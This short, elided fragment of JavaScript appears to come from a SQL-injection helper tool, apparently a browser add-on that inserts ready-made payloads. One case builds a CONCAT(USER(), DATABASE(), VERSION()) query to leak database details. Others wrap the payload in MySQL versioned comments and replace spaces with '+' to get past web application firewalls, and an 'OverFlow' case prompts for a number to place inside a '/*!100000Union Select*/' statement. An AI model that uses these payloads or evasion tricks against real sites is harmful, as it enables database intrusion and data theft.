...
// BASIC STATEMENTS
case 'Basic statements1': 
    txt = "CONCAT(USER(),0x3c62723e,DATABASE(),0x3c62723e,VERSION())";
					break;
//TABLES
			case 'Tables1':
	...
	//Waf String
			...
			case 'CalcWaf8': txt = txt.replace(/ /g, "+");
				txt= ("/*!40122" + txt + "*/");
					break;
			case 'OverFlow': 
          var number = prompt( "Amount of number to use in the /*!100000Union Select*/ Statement", "100000" );
